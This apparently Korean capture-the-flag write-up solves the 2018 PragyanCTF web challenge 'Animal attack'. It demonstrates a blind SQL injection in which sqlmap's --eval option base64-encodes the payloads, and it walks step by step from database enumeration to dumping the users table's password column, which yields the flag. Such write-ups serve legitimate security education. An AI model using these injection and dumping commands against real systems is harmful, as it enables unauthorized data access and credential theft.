# [2018_PragyanCTF] \[Web] Animal attack

## Key words

- Blind SQL injection
- SQL map eval

## Solution

http://128.199.224.175:24000/

우선 문자열을 입력하여 검색을 해보면 사용자의 입력 값이 base64로 인코드되어 넘어가는 것을 확인할 수 있습니다.

또한 검색창에 `aaaaaaaaa' or 1=1#`을 넣어서 검색해보면 SQL injection이 가능하다는 것을 확인할 수 있었습니다.

union 문자열을 입력해본 결과 필터링 로직이 있었습니다. 따라서 sqlmap으로 블라인드 SQL 인젝을 시도했습니다.

SQL map을 돌려야 하는데 사용자 입력값이 base64로 인코딩되는게 문제였습니다. 하지만 sqlmap의 --eval 옵션으로 입력값을 커스터마이징시킬 수 있었습니다.

```
$ sqlmap -u "http://128.199.224.175:24000" --data "spy_name=a" --method POST --eval "import base64; spy_name = base64.b64encode(spy_name)" --databases

available databases [2]:
[*] information_schema
[*] spy_database
```

DB : spy_database

```
$ sqlmap -u "http://128.199.224.175:24000" --data "spy_name=a" --method POST --eval "import base64; spy_name = base64.b64encode(spy_name)" -D spy_database --tables

Database: spy_database
[2 tables]
+-------+
| spies |
| users |
+-------+
```

spies는 우리가 검색한 데이터를 담고 있는 테이블이었습니다. 따라서 table은 users를 골랐습니다.

```
$ sqlmap -u "http://128.199.224.175:24000" --data "spy_name=a" --method POST --eval "import base64; spy_name = base64.b64encode(spy_name)" -D spy_database -T users --columns 

Database: spy_database
Table: users
[4 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| email    | varchar(40) |
| id       | int(5)      |
| password | varchar(40) |
| username | varchar(20) |
+----------+-------------+
```

컬럼 내용들

```
$ sqlmap -u "http://128.199.224.175:24000" --data "spy_name=a" --method POST --eval "import base64; spy_name = base64.b64encode(spy_name)" -D spy_database -T users -C password --dump

Database: spy_database
Table: users
[2 entries]
+--------------------------------------+
| password                             |
+--------------------------------------+
| pctf{L31's~@Ll_h4il-1h3-c4T_Qu33n.?} |
| test                                 |
+--------------------------------------+
```

password를 덤프 떠보면 플래그를 확인할 수 있습니다.